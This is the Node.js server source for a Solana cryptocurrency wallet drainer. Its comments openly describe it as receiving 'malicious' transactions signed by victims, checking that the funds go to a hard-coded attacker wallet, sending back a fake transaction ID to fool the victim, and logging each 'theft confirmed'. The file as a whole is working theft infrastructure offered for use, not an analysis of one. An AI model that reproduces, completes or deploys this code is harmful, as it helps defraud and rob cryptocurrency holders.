const express = require('express');
const bodyParser = require('body-parser');
const { Connection, Transaction } = require('@solana/web3.js');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Replace with your actual attacker wallet
const ATTACKER_WALLET = 'prVPrLRQwq4ba4BZ45zTSQRChWMLmDprkfXLQPNTT9rL4z3dU1x4cSe5NkokGaFaCQyJBZ4CUahoUFZBipdFkXG';

// Solana connection
const connection = new Connection('https://rpc.ankr.com/solana');

// API Key middleware
const API_KEY = 'your-secret-key-123';
const authenticate = (req, res, next) => {
  const key = req.headers['x-api-key'];
  if (key !== API_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// Collect endpoint - receives the malicious transaction
app.post('/collect', authenticate, async (req, res) => {
  try {
    const { wallet, signedTx, balances } = req.body;

    // Deserialize the transaction
    const txBuffer = Buffer.from(signedTx, 'base64');
    const transaction = Transaction.from(txBuffer);

    // Verify the transaction is sending to our wallet
    const transferInstruction = transaction.instructions.find(ix =>
      ix.programId.toString() === '11111111111111111111111111111111'
    );

    if (!transferInstruction) {
      return res.status(400).json({ error: "Invalid transaction" });
    }

    const toPubkey = transferInstruction.keys[1].pubkey.toString();
    if (toPubkey !== ATTACKER_WALLET) {
      return res.status(400).json({ error: "Invalid recipient" });
    }

    // Create a fake gas fee transaction ID (for the success screen)
    const fakeTxId = 'fakeTxId' + Math.random().toString(36).substring(2, 15);

    res.json({
      success: true,
      gasTxId: fakeTxId,
      message: "Transaction received"
    });
  } catch (error) {
    console.error("Error in /collect:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Confirm endpoint - logs successful thefts
app.post('/confirm', authenticate, (req, res) => {
  const { wallet, txId, amount } = req.body;
  console.log(`[THEFT CONFIRMED] ${amount} SOL stolen from ${wallet} | TX: ${txId}`);
  res.json({ success: true });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
